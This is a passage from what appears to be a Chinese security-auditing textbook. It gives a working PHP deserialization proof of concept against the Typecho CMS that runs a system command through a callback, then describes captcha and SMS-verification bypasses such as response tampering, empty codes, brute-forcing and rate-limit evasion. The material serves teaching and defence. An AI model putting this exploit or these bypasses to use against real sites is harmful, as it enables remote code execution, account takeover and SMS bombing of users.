\u200B    if ($this->_filter) {\r
\r
\u200B      foreach ($this->_filter as $filter) {\r
\r
\u200B        //\u56DE\u8C03\u51FD\u6570\r
\r
\u200B        **$value = is_array($value) ? array_map($filter, $value) :**\r
\r
\u200B        **call_user_func($filter, $value);**\r
\r
\u200B      }\r
\r
\u200B      $this->_filter = array();}\r
\r
\u200B    return $value;}\r
\r
\r
\r
\u5B9E\u9645\u4E0A\u662F\u8C03\u7528\u4E86Typecho_Request\u7C7B\u7684_applyFilter\u51FD\u6570\uFF0C\u8BE5\u51FD\u6570\u5185\u90E8\u8C03\u7528\u4E86array_map\u51FD\u6570\u548Ccall_user_func\u51FD\u6570\uFF0C\u5E76\u5C06value\u548CTypecho_Request\u5BF9\u8C61\u7684_filter\u5C5E\u6027\u4F5C\u4E3A\u53C2\u6570\uFF08\u8FD9\u4E24\u4E2A\u53C2\u6570\u90FD\u662F\u53EF\u63A7\u7684\uFF09\uFF0C\u5E76\u4E14\u8FD9\u4E24\u4E2APHP\u5185\u7F6E\u7684\u7CFB\u7EDF\u51FD\u6570\u4F1A\u81EA\u52A8\u4E3A\u53C2\u6570\u8C03\u7528\u56DE\u8C03\u51FD\u6570\uFF0Cfilter\u662F\u56DE\u8C03\u51FD\u6570\uFF0Cvalue\u662F\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\uFF08call_user_function\u662F\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u5371\u9669\u51FD\u6570\uFF09\u3002_applyFilter\u51FD\u6570\u5185\u90E8\u6CA1\u6709\u5BF9value\u548Cfilter\u505A\u4EFB\u4F55\u7684\u8FC7\u6EE4\uFF0C\u6700\u7EC8\u5BFC\u81F4\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5229\u7528\u3002\r
\r
\u81F3\u6B64\uFF0C\u7ED9\u51FA\u8BE5\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5B8C\u6574pop\u94FE\uFF0C\u5982\u56FE10-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image500.gif)\r
\r
\u56FE10-11 POP\u5229\u7528\u94FE\u56FE\r
\r
\uFF083\uFF09\u6784\u9020\u6F0F\u6D1E\u5229\u7528POC\r
\r
\u901A\u8FC7\u4E0A\u8FF0\u7684POP\u94FE\u5206\u6790\uFF0C\u7F16\u5199\u51FA\u8BE5\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684POC\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
class **Typecho_Feed**{\r
\r
  const RSS2 = 'RSS 2.0';\r
\r
  private $_type;\r
\r
  private $_items;\r
\r
  public function __construct(){\r
\r
\u200B    //__toString\u51FD\u6570\u68C0\u67E5\r
\r
\u200B    $this->_type = self::RSS2;\r
\r
\u200B    //\u89E6\u53D1__get\u51FD\u6570\r
\r
\u200B    $_item['author'] = new **Typecho_Request()**;\r
\r
\u200B    //\u89E6\u53D1\u9519\u8BEF\r
\r
\u200B    $_item['category'] = array(new Typecho_Request());\r
\r
\u200B     $this->_items[0] = $_item;}\r
\r
}\r
\r
class **Typecho_Request**{\r
\r
  private $_params = array();\r
\r
  private $_filter = array();\r
\r
  public function __construct(){\r
\r
\u200B    //\u56DE\u8C03\u51FD\u6570\u7684\u53C2\u6570\r
\r
\u200B    $this->_params['screenName'] = "dir";\r
\r
\u200B    //\u56DE\u8C03\u51FD\u6570\r
\r
\u200B    $this->_filter[0] = "system";}\r
\r
}\r
\r
$data = new Typecho_Feed();\r
\r
$poc = array('adapter' => $data,'prefix' => "typecho_");\r
\r
//\u5E8F\u5217\u5316\r
\r
$s = serialize($poc);\r
\r
//base64\u7F16\u7801\r
\r
echo base64_encode($s);\r
\r
?>\r
\r
\r
\r
  \u5229\u7528\u7ED3\u679C\u5982\u56FE10-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image502.gif)\r
\r
\u56FE10-12 \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5229\u7528\u7ED3\u679C\u56FE\r
\r
## 10.6 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u3001\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5B89\u5168\u95EE\u9898\uFF0C\u901A\u8FC7\u5BF9\u5E38\u89C1\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684\u5BA1\u8BA1\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u65B9\u6CD5\u3002\u4E0E\u6B64\u540C\u65F6\uFF0C\u7ED9\u51FA\u5B58\u5728\u6F0F\u6D1E\u7684CMS\u5BA1\u8BA1\u6D41\u7A0B\uFF0C\u4F8B\u5982\uFF1Aphpcms2008\u3002\u7ED9\u51FAPHP\u4E2D\u7684\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u4E0E\u4EE3\u7801\u6848\u4F8B\u5206\u6790\u3002\r
\r
\u672C\u5355\u5143\u8981\u6C42\u8BFB\u8005\u7740\u91CD\u638C\u63E1\u53D8\u91CF\u8986\u76D6\u3001\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u51FD\u6570\u7684PHP\u4EE3\u7801\u5F62\u5F0F\uFF0C\u5E76\u901A\u8FC7\u5BF9\u5C0F\u578BCMS\u7684\u4EE3\u7801\u8D70\u8BFB\u5BA1\u8BA1\u4EE3\u7801\u5176\u4E2D\u5B58\u5728\u7684\u6F0F\u6D1E\u3002\u4E0B\u56FE9-11\u4E3A\u53D8\u91CF\u8986\u76D6\u4E0E\u53CD\u5E8F\u5217\u5316\u603B\u7ED3\u56FE\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u514311 \u4E1A\u52A1\u529F\u80FD\u5BA1\u8BA1\r
\r
\u4E0E\u4F20\u7EDF\u7C7B\u578B\u6F0F\u6D1E\u76F8\u6BD4\uFF0C\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u6CA1\u6709\u660E\u663E\u7684\u654F\u611F\u51FD\u6570\u4E14\u4E0D\u5BB9\u6613\u88AB\u53D1\u73B0\u3002\u7F51\u7AD9\u4E2D\u5F88\u591A\u4E1A\u52A1\u529F\u80FD\u90FD\u5C06\u5B58\u5728\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1A\u5F31\u7C7B\u578B\u5B89\u5168\u95EE\u9898\u3001\u7528\u6237\u9A8C\u8BC1\u7801\u529F\u80FD\u3001\u5BC6\u7801\u627E\u56DE\u529F\u80FD\u3001\u5145\u503C\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\uFF0C\u672C\u5355\u5143\u5206\u4E3A\u56DB\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECDPHP\u8BED\u8A00\u4E2D\u7684\u5F31\u7C7B\u578B\u5B89\u5168\u95EE\u9898\uFF0C\u5305\u62EC\uFF1Ais_numeric()\u3001in_array()\u3001strcmp()\u3001\u53CC\u7B49\u4E8E\u4E0E\u4E09\u7B49\u4E8E\u5224\u65AD\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1A\u9A8C\u8BC1\u7801\u529F\u80FD\u7684\u4ECB\u7ECD\u3001\u9A8C\u8BC1\u7801\u529F\u80FD\u5E38\u89C1\u7684\u5B89\u5168\u95EE\u9898\u3001\u9A8C\u8BC1\u7801\u7ED5\u8FC7\u7684\u65B9\u6CD5\uFF0C\u5E76\u4F7F\u7528NBCMS\u5BF9\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1A\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u4ECB\u7ECD\u3001\u5BC6\u7801\u91CD\u7F6E\u6F0F\u6D1E\u7684\u5E38\u89C1\u6848\u4F8B\uFF0C\u5E76\u4F7F\u7528dedecms\u5BF9\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u6F0F\u6D1E\u8FDB\u884C\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECD\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1A\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u4ECB\u7ECD\u3001\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u7684\u6316\u6398\u4E0E\u9632\u5FA1\u3001\u4EA4\u6613\u652F\u4ED8\u6F0F\u6D1E\u7684\u5E38\u89C1\u5B89\u5168\u95EE\u9898\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image504.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3PHP\u4E2D\u7684\u5F31\u7C7B\u578B\u5B89\u5168\u95EE\u9898\uFF1B\r
\r
\\2.  \u719F\u6089\u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\u7684\u5E38\u89C1\u95EE\u9898\uFF1B\r
\r
\\3.  \u719F\u6089\u5BC6\u7801\u91CD\u7F6E\u529F\u80FD\u6F0F\u6D1E\u7684\u5E38\u89C1\u5B89\u5168\u95EE\u9898\uFF1B\r
\r
\\4.  \u638C\u63E1\u4EA4\u6613\u652F\u4ED8\u529F\u80FD\u6F0F\u6D1E\u7684\u5E38\u89C1\u5B89\u5168\u95EE\u9898\u3002\r
\r
## 11.1 \u9A8C\u8BC1\u7801\u529F\u80FD\u6F0F\u6D1E\r
\r
### 11.1.1 \u9A8C\u8BC1\u7801\u529F\u80FD\u4ECB\u7ECD\r
\r
\u9A8C\u8BC1\u7801\u529F\u80FD\u5E38\u88AB\u7528\u4E8E\u7F51\u7AD9\u7528\u6237\u6CE8\u518C\u3001\u8D26\u6237\u5B89\u5168\u767B\u5F55\u3001\u5FD8\u8BB0\u5BC6\u7801\u3001\u786E\u8BA4\u4E0B\u5355\u7B49\u5E94\u7528\u573A\u666F\uFF0C\u7279\u522B\u662F\u4E00\u4E9B\u6D89\u53CA\u5230\u7528\u6237\u4E2A\u4EBA\u654F\u611F\u884C\u4E3A\u65F6\u5019\uFF0C\u4E3A\u4E86\u786E\u8BA4\u64CD\u4F5C\u662F\u7528\u6237\u672C\u4EBA\u6267\u884C\uFF0C\u901A\u5E38\u4F1A\u4F7F\u7528\u9A8C\u8BC1\u7801\u8FDB\u884C\u4E8C\u6B21\u8BA4\u8BC1\u3002\u9A8C\u8BC1\u7801\u7684\u5F62\u5F0F\u4E5F\u591A\u79CD\u591A\u6837\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\uFF1A\u56FE\u7247\u9A8C\u8BC1\u7801\u3001\u6ED1\u52A8\u9A8C\u8BC1\u7801\u3001\u77ED\u4FE1/\u90AE\u7BB1\u9A8C\u8BC1\u7801\u3001\u4E8C\u7EF4\u7801\u7B49\u5F62\u5F0F\u3002\u65E9\u671F\u7F51\u7AD9\u4E2D\u5F88\u591A\u9A8C\u8BC1\u7801\u529F\u80FD\u90FD\u5B58\u5728\u7206\u7834\u6216\u673A\u5668\u8BC6\u522B\u7684\u5B89\u5168\u95EE\u9898\u3002\r
\r
### 11.1.2 \u9A8C\u8BC1\u7801\u529F\u80FD\u5E38\u89C1\u5B89\u5168\u95EE\u9898\r
\r
\u672C\u5C0F\u8282\u5C06\u5BF9\u9A8C\u8BC1\u7801\u529F\u80FD\u7684\u5B89\u5168\u95EE\u9898\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u5176\u4E3B\u8981\u5305\u542B\u6362\u4EE5\u4E0B\u56DB\u79CD\uFF1A\r
\r
\uFF081\uFF09\u77ED\u4FE1\u9A8C\u8BC1\u7801\u8F70\u70B8\r
\r
\u8BE5\u95EE\u9898\u4E3B\u8981\u662F\u7531\u4E8E\u7F51\u7AD9\u7A0B\u5E8F\u8BBE\u8BA1\u65F6\u672A\u5BF9\u77ED\u4FE1\u9A8C\u8BC1\u7801\u8FDB\u884C\u91CD\u53D1\u9650\u5236\u6216\u9650\u5236\u65F6\u95F4\u95F4\u9694\u8FC7\u77ED\u5BFC\u81F4\u3002\u8BE5\u5B89\u5168\u95EE\u9898\u5F80\u5F80\u51FA\u73B0\u5728\u4E00\u4E9B\u5C0F\u578B\u7F51\u7AD9\u4E2D\uFF0C\u8FD1\u51E0\u5E74\u5F88\u5C11\u5B58\u5728\u901A\u8FC7HTTP GET\u8BF7\u6C42\u53D1\u9001\u77ED\u4FE1\u9A8C\u8BC1\u7801\u4E86\uFF0C\u57FA\u672C\u90FD\u662F\u4F7F\u7528HTTP POST\u8BF7\u6C42\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u4F7F\u7528BurpSuite\u6293\u5305\u8F6F\u4EF6\u53EF\u4EE5\u91CD\u653E\uFF08Repeater\uFF09\u8BF7\u6C42\uFF0C\u5BF9\u4E8E\u540E\u7AEF\u6CA1\u6709\u505A\u9650\u5236\u7684\u7F51\u7AD9\u5C31\u53EF\u4EE5\u8FBE\u5230\u77ED\u4FE1\u8F70\u70B8\u6548\u679C\u3002\r
\r
\u9488\u5BF9\u77ED\u4FE1\u9A8C\u8BC1\u7801\u8F70\u70B8\u95EE\u9898\uFF0C\u7ED9\u51FA\u5982\u4E0B\u51E0\u70B9\u9632\u5FA1\u63AA\u65BD\uFF1A\r
\r
l \u8BBE\u7F6E\u53D1\u9001\u95F4\u9694\uFF0C\u5373\u5355\u4E00\u7528\u6237\u53D1\u9001\u8BF7\u6C42\u540E\uFF0C\u4E0E\u4E0B\u6B21\u53D1\u9001\u8BF7\u6C42\u65F6\u95F4\u9700\u8981\u95F4\u969460\u79D2\u3002\r
\r
l \u8BBE\u7F6E\u5355\u7528\u6237\u53D1\u9001\u4E0A\u9650\uFF0C\u5373\u8BBE\u7F6E\u6BCF\u4E2A\u7528\u6237\u5355\u4F4D\u65F6\u95F4\u5185\u53D1\u9001\u77ED\u4FE1\u6570\u7684\u4E0A\u9650\uFF0C\u5982\u679C\u8D85\u8FC7\u9608\u503C\u5C31\u4E0D\u5141\u8BB8\u4ECA\u5929\u518D\u6B21\u8C03\u7528\u77ED\u4FE1\u63A5\u53E3\uFF08\u9608\u503C\u6839\u636E\u4E1A\u52A1\u60C5\u51B5\u8BBE\u7F6E\uFF09\u3002\r
\r
l \u6839\u636EIP\u5730\u5740\u8BBE\u7F6E\u77ED\u4FE1\u53D1\u9001\u4E0A\u9650\uFF0C\u8FD9\u79CD\u60C5\u51B5\u53EF\u9884\u9632\u591A\u7528\u6237\u53D1\u9001\u77ED\u4FE1\u653B\u51FB\u7684\u573A\u666F\u3002\r
\r
\uFF082\uFF09\u65E0\u6548\u9A8C\u8BC1\r
\r
\u67D0\u4E9B\u7F51\u7AD9\u4E2D\u867D\u7136\u6709\u9A8C\u8BC1\u7801\u6A21\u5757\uFF0C\u4F46\u9A8C\u8BC1\u6A21\u5757\u4E0E\u4E1A\u52A1\u529F\u80FD\u6CA1\u6709\u5173\u8054\u6027\uFF0C\u4ECE\u800C\u5F62\u6210\u4E86\u65E0\u6548\u9A8C\u8BC1\u5B89\u5168\u95EE\u9898\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
l \u9A8C\u8BC1\u7801\u6821\u9A8C\u65E0\u6548\r
\r
\u83B7\u53D6\u77ED\u4FE1\u9A8C\u8BC1\u7801\u540E\uFF0C\u968F\u610F\u8F93\u5165\u9A8C\u8BC1\u7801\u5373\u53EF\u6821\u9A8C\u901A\u8FC7\u3002\u7136\u540E\uFF0C\u76F4\u63A5\u8F93\u5165\u4E24\u6B21\u5BC6\u7801\u53EF\u6210\u529F\u66F4\u6539\u7528\u6237\u5BC6\u7801\uFF0C\u6CA1\u6709\u5BF9\u77ED\u4FE1\u9A8C\u8BC1\u7801\u8FDB\u884C\u9A8C\u8BC1\uFF0C\u53EF\u80FD\u5BFC\u81F4CSRF\u7B49\u95EE\u9898\u3002\r
\r
l \u4EFB\u610F\u7528\u6237\u6CE8\u518C\r
\r
\u5229\u7528\u624B\u673A\u53F7\u63A5\u6536\u9A8C\u8BC1\u7801\u8FDB\u884C\u9A8C\u8BC1\uFF0C\u8DF3\u8F6C\u5230\u7528\u6237\u6CE8\u518C\u9875\u9762\u3002\u901A\u8FC7\u4F7F\u7528BurpSuite\u6293\u5305\u7BE1\u6539\u624B\u673A\u53F7\uFF0C\u4F7F\u7528\u4EFB\u610F\u624B\u673A\u53F7\u8FDB\u884C\u6CE8\u518C\u3002\r
\r
\uFF083\uFF09\u9A8C\u8BC1\u7801\u7ED5\u8FC7\r
\r
\u9A8C\u8BC1\u7801\u7ED5\u8FC7\u7684\u65B9\u5F0F\u5B58\u5728\u5F88\u591A\u79CD\uFF0C\u5305\u62EC\uFF1A\u901A\u8FC7\u4FEE\u6539\u8BF7\u6C42\u5305\u5185\u5BB9\u3001\u4FEE\u6539\u54CD\u5E94\u5305\u5185\u5BB9\u3001\u9A8C\u8BC1\u7801\u4E3A\u7A7A\u7ED5\u8FC7\u3001\u9A8C\u8BC1\u7801\u7206\u7834\u7B49\u3002\r
\r
\uFF084\uFF09\u4EFB\u610F\u7528\u6237\u64CD\u4F5C\r
\r
\u6B63\u5E38\u60C5\u51B5\u4E0B\uFF0C\u7528\u6237\u7684\u77ED\u4FE1\u9A8C\u8BC1\u7801\u4EC5\u80FD\u4F7F\u7528\u4E00\u6B21\u3002\u4F46\u662F\uFF0C\u82E5\u9A8C\u8BC1\u7801\u548C\u624B\u673A\u53F7\u672A\u7ED1\u5B9A\u4E14\u9A8C\u8BC1\u7801\u5728\u4E00\u6BB5\u65F6\u671F\u5185\u90FD\u6709\u6548\uFF0C\u5219\u53EF\u80FD\u51FA\u73B0\u5982\u4E0B\u60C5\u51B5\uFF1A\r
\r
\u7528\u6237A\u624B\u673A\u7684\u9A8C\u8BC1\u7801\uFF0C\u7528\u6237B\u53EF\u4EE5\u62FF\u6765\u4F7F\u7528\uFF1B\u7528\u6237A\u624B\u673A\u5728\u4E00\u5B9A\u65F6\u95F4\u95F4\u9694\u5185\u63A5\u5230\u4E24\u4E2A\u9A8C\u8BC1\u7801\u90FD\u53EF\u4F7F\u7528\u3002\u8FD9\u5C06\u5BFC\u81F4\u9A8C\u8BC1\u7801\u529F\u80FD\u7684\u4EFB\u610F\u7528\u6237\u64CD\u4F5C\u5B89\u5168\u95EE\u9898\u3002\r
\r
### 11.1.3   \u9A8C\u8BC1\u7801\u7ED5\u8FC7\u65B9\u5F0F\r
\r
\uFF081\uFF09   \u4FEE\u6539\u54CD\u5E94\u5305\u8FD4\u56DE\u503C\u7ED5\u8FC7\u9A8C\u8BC1\r
\r
\u5BA2\u6237\u7AEF\u5728\u672C\u5730\u4E3B\u673A\u5224\u65AD\u9A8C\u8BC1\u7801\u662F\u5426\u6B63\u786E\uFF0C\u4F46\u662F\u8BE5\u5224\u65AD\u7ED3\u679C\u80FD\u591F\u5728\u672C\u5730\u8FDB\u884C\u4FEE\u6539\u3002\u4F8B\u5982\uFF1A\u9A8C\u8BC1\u7801\u6B63\u786E\u8FD4\u56DE\u72B6\u6001\u503C\u4E3Asuccess\uFF0C\u5931\u8D25\u8FD4\u56DE\u7684\u72B6\u6001\u503C\u4E3Afalse\uFF0C\u901A\u8FC7\u4FEE\u6539\u8FD4\u56DE\u72B6\u6001\u4E3Asuccess\uFF0C\u5373\u53EF\u7ED5\u8FC7\u9A8C\u8BC1\u5E76\u91CD\u7F6E\u7528\u6237\u5BC6\u7801\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FA\u5E94\u7528\u573A\u666F\uFF1A\r
\r
l \u7F51\u7AD9\u4E2D\u5FD8\u8BB0\u5BC6\u7801\u529F\u80FD\u3002\u901A\u8FC7\u4FEE\u6539\u77ED\u4FE1\u9A8C\u8BC1\u7684\u54CD\u5E94\u62A5\u6587\u7ED5\u8FC7\u8EAB\u4EFD\u9A8C\u8BC1\uFF0C\u6210\u529F\u4FEE\u6539\u5176\u4ED6\u4EBA\u5BC6\u7801\u3002\u4E0B\u9762\u7ED9\u51FA\u4F7F\u7528BurpSuite\u62E6\u622A\u54CD\u5E94\u5305\uFF0C\u5C06\u5176\u8FD4\u56DE\u72B6\u6001\u4ECEerror\u4FEE\u6539\u4E3AOK\uFF0C\u4ECE\u800C\u6210\u529F\u4FEE\u6539\u5BC6\u7801\u6848\u4F8B\uFF0C\u5982\u56FE11-1\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image506.gif)\r
\r
\u56FE11-1 \u4FEE\u6539\u8FD4\u56DE\u72B6\u6001\u56FE\r
\r
l \u7F51\u7AD9\u4E2D\u7528\u6237\u6CE8\u518C\u529F\u80FD\u3002\u901A\u8FC7\u4FEE\u6539\u77ED\u4FE1\u9A8C\u8BC1\u7684\u54CD\u5E94\u62A5\u6587\u5E76\u66FF\u6362\u4E3A\u81EA\u5DF1\u7684\u624B\u673A\u53F7\uFF0C\u7ED5\u8FC7\u9A8C\u8BC1\u7801\u7684\u9650\u5236\uFF0C\u9020\u6210\u4EFB\u610F\u7528\u6237\u6CE8\u518C\u529F\u80FD\u3002\u4E0B\u56FE11-2\u4E3A\u67D0\u7F51\u7AD9\u7528\u6237\u6CE8\u518C\u6A21\u5757\uFF0C\u5728\u6CE8\u518C\u9875\u9762\u5B9E\u73B0\u4EFB\u610F\u7528\u6237\u6CE8\u518C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image508.jpg)\r
\r
\u56FE11-2 \u7F51\u7AD9\u7528\u6237\u6CE8\u518C\u56FE\r
\r
l \u6709\u4E9B\u767B\u5F55\u4E5F\u5B58\u5728\u7C7B\u4F3C\u7684\u95EE\u9898\uFF0C\u968F\u4FBF\u8F93\u5165\u8D26\u53F7\u5BC6\u7801\uFF0C\u62E6\u622A\u8FD4\u56DE\u7684\u54CD\u5E94\u5305\uFF0C\u5C06\u5305\u66FF\u6362\u4E3AA\u8D26\u53F7\u5BC6\u7801\u6B63\u786E\u7684\u767B\u5F55\u8FD4\u56DE\u54CD\u5E94\u5305\uFF08\u524D\u63D0\u662FA\u8D26\u53F7\u7684Cookie\u662F\u6709\u6548\u7684\uFF09\uFF0C\u5373\u53EF\u767B\u5F55\u5230A\u8D26\u53F7\u3002\r
\r
\uFF082\uFF09   \u9A8C\u8BC1\u7801\u7F6E\u7A7A\u7ED5\u8FC7\u9A8C\u8BC1\r
\r
\u5728\u7F51\u7AD9\u7684\u77ED\u4FE1\u9A8C\u8BC1\u7801\u5904\u8F93\u5165\u9519\u8BEF\u9A8C\u8BC1\u7801\u4F1A\u8FDB\u884C\u6821\u9A8C\uFF0C\u4F46\u662F\u5982\u679C\u9A8C\u8BC1\u7801\u4E3A\u7A7A\u5219\u4E0D\u8FDB\u884C\u6821\u9A8C\u4ECE\u800C\u7ED5\u8FC7\u9A8C\u8BC1\u3002\u56FE11-3\u4E3A\u67D0\u7F51\u7AD9\u767B\u5F55\u529F\u80FD\u4E2D\u77ED\u4FE1\u9A8C\u8BC1\u7801\u767B\u5F55\u65F6\u4F7F\u7528BurpSuite\u6293\u53D6\u7684\u6570\u636E\u5305\uFF0C\u5C06code\u53C2\u6570\u7F6E\u4E3A\u7A7A\uFF0C\u5373\u53EF\u767B\u5F55\u4EFB\u610F\u8D26\u6237\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image510.gif)\r
\r
\u56FE11-3 \u9A8C\u8BC1\u7801\u7F6E\u7A7A\u7ED5\u8FC7\u56FE\r
\r
\uFF083\uFF09   \u9A8C\u8BC1\u7801\u8FC7\u77ED\u7206\u7834\u7ED5\u8FC7\r
\r
\u6709\u7684\u77ED\u4FE1\u9A8C\u8BC1\u7801\u4F4D\u6570\u592A\u77ED\uFF0C\u91C7\u75284\u4E3A\u7EAF\u6570\u5B57\u7684\u77ED\u4FE1\u9A8C\u8BC1\u7801\u4F5C\u4E3A\u767B\u5F55\u7684\u51ED\u8BC1\uFF0C\u6B64\u7C7B\u7F51\u7AD9\u82E5\u6CA1\u6709\u5BF9\u77ED\u4FE1\u9A8C\u8BC1\u7801\u8FDB\u884C\u6B21\u6570\u9650\u5236\uFF0C\u5C31\u5F88\u5BB9\u6613\u91C7\u7528\u5DE5\u5177\u8FDB\u884C\u7206\u7834\u9A8C\u8BC1\u7801\u767B\u5F55\u3002\u4F8B\u5982\uFF1A\u5BF9\u4E8E\u91CD\u7F6E\u5BC6\u7801\u529F\u80FD\uFF0C\u5176\u4F1A\u6839\u636E\u77ED\u4FE1\u9A8C\u8BC1\u7801\u5224\u65AD\u662F\u5426\u80FD\u4FEE\u6539\u6210\u529F\uFF0C\u8BE5\u529F\u80FD\u7684\u9A8C\u8BC1\u7801\u662F\u56DB\u4F4D\u7EAF\u6570\u5B57\u53EF\u4EE5\u8FDB\u884C\u7206\u7834\u3002\u901A\u8FC7BurpSuite\u62E6\u622A\u6570\u636E\u5305\uFF0C\u5E76\u5BF9\u62E6\u622A\u6570\u636Ecode=4935&mobile=18556530793&pwd=123456a\u8FDB\u884C\u7206\u7834\uFF0C\u7ED3\u679C\u5982\u56FE11-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image512.gif)\r
\r
\u56FE11-4 \u9A8C\u8BC1\u7801\u7206\u7834\u56FE\r
\r
\uFF084\uFF09   \u5229\u7528\u63A5\u53E3\u6807\u8BB0\u7ED5\u8FC7\u77ED\u4FE1\u9650\u5236\r
\r
\u7F51\u7AD9\u4E2D\u7684\u6CE8\u518C\u3001\u5FD8\u8BB0\u5BC6\u7801\u3001\u4FEE\u6539\u5BC6\u7801\u529F\u80FD\uFF0C\u5747\u53EF\u80FD\u5B58\u5728\u77ED\u4FE1\u9A8C\u8BC1\u529F\u80FD\u3002\u8BE5\u7F51\u7AD9\u5C06\u53EF\u80FD\u6839\u636E\u8BBE\u7F6E\u7684\u53C2\u6570\u503C\u4E0D\u540C\uFF0C\u6765\u5224\u65AD\u5176\u6267\u884C\u7684\u529F\u80FD\u3002\u4F8B\u5982\uFF1A\u5F53type=1\u65F6\u4E3A\u6CE8\u518C\uFF0C\u5F53type=2\u65F6\u4E3A\u5FD8\u8BB0\u5BC6\u7801\uFF0C\u5F53type=3\u65F6\u4E3A\u4FEE\u6539\u5BC6\u7801\u7B49\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u53C2\u6570type\u7684\u503C\uFF0C\u6765\u7ED5\u8FC7\u4E00\u5206\u949F\u5185\u53EA\u53D1\u9001\u4E00\u6B21\u7684\u65F6\u95F4\u9650\u5236\uFF0C\u8FBE\u5230\u77ED\u4FE1\u8F70\u70B8\u7684\u76EE\u7684\u3002\r
\r
\uFF085\uFF09   \u5229\u7528\u7A7A\u683C\u7ED5\u8FC7\u77ED\u4FE1\u9650\u5236\r
\r
\u901A\u8FC7\u5728\u53C2\u6570\u503C\u7684\u524D\u9762\u52A0\u4E0A\u7A7A\u683C\uFF0C\u8FDB\u884C\u7ED5\u8FC7\u4E00\u5929\u5185\u53D1\u9001\u6B21\u6570\u7684\u9650\u5236\u3002\u4F8B\u5982\uFF1Amobile=\u201D13211111111\u201D\uFF0C\u4E00\u5929\u53EF\u4EE5\u53D1\u900110\u6B21\uFF0C\u8D85\u8FC710\u6B21\u4ECA\u5929\u5C06\u4E0D\u518D\u53D1\u9001\uFF0C\u7B2C\u4E8C\u5929\u624D\u53EF\u4EE5\u7EE7\u7EED\u53D1\u9001\u3002\u4F46\u662F\uFF0C\u53EF\u4EE5\u901A\u8FC7\u5728\u624B\u673A\u53F7\u524D\u9762\u6216\u540E\u9762\u52A0\u4E0A\u7A7A\u683C\u53C8\u53EF\u4EE5\u53D1\u900110\u6B21\u3002\u6BD4\u5982\uFF0Cmobile= \u201C 13211111111\u201D\uFF0C\u524D\u9762\u52A0\u4E2A\u7A7A\u683C\uFF0C\u5C31\u53EF\u4EE5\u518D\u6B21\u53D1\u9001\u6210\u529F\u3002\r
\r
\uFF086\uFF09   \u901A\u8FC7\u4FEE\u6539Cookie\u503C\u7ED5\u8FC7\u77ED\u4FE1\u9650\u5236\r
\r
